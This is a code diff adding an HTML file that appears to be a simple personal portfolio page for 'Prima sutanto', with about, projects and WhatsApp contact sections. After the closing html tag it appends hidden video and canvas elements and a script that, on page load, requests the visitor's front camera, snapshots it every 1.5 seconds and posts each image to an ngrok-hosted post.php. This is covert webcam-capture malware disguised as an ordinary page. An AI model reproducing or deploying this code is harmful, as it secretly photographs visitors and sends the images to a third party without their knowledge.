@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portfolio Prima</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        header {
+            background: #333;
+            color: #fff;
+            padding: 1rem 0;
+            text-align: center;
+        }
+        
+        header h1 {
+            margin: 0;
+            font-size: 2.5rem;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: center;
+            background: #444;
+            padding: 0.5rem 0;
+        }
+        
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 1rem;
+            font-weight: bold;
+        }
+        
+        nav a:hover {
+            text-decoration: underline;
+        }
+        
+        .container {
+            width: 80%;
+            margin: 2rem auto;
+        }
+        
+        .section {
+            margin-bottom: 2rem;
+        }
+        
+        .section h2 {
+            font-size: 2rem;
+            color: #333;
+            margin-bottom: 1rem;
+        }
+        
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem 0;
+            margin-top: 2rem;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>portofolio Prima sutanto</h1>
+    </header>
+    <nav>
+        <a href="#about">About</a>
+        <a href="#projects">Projects</a>
+        <a href="#contact">Contact</a>
+    </nav>
+    <div class="container">
+        <section id="about" class="section">
+            <h2>About Me</h2>
+            <p>eyyo whatsapp ges welcome to portofolio prima </p>
+        </section>
+        <section id="projects" class="section">
+            <h2>Projects</h2>
+            <p>Prima cuma gabut </p>
+            <ul>
+                <li>Project 1: A simple to-do app using JavaScript</li>
+                <li>Project 2: A portfolio website using HTML and CSS</li>
+                <li>Project 3: A blog platform built with PHP and MySQL</li>
+            </ul>
+        </section>
+        <section id="contact" class="section">
+            <h2>Contact</h2>
+            <p>If you'd like to get in touch, please email me at <a href="mailto:yourname@example.com">primasutanto4gmail.com</a>.</p>
+            <li>
+                <a href="https://wa.me/nomorHP"></a>
+                <a href="https://wa.me/6285766532699">Hubungi melalui Whatsapp</a>
+            </li>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 My Portfolio. All Rights Reserved.</p>
+    </footer>
+</body>
+
+</html>
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: {
+                cat: imgdata
+            },
+            url: 'https://78814efd5917.ngrok.io/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {
+                // call the function that handles the response/results
+            },
+            error: function() {}
+        });
+    };
+
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+            audio: false,
+            video: {
+
+                facingMode: "user"
+            }
+        } // Access webcam
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+        } catch (e) {
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+
+        var context = canvas.getContext('2d');
+        setInterval(function() {
+
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 1500);
+
+
+    }
+
+    // Load init
+    init();
+</script>
+
+<body>
+
+    <body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+       -webkit-background-size: cover;
+       -moz-background-size: cover;
+       -o-background-size: cover;
+       background-size: cover;">
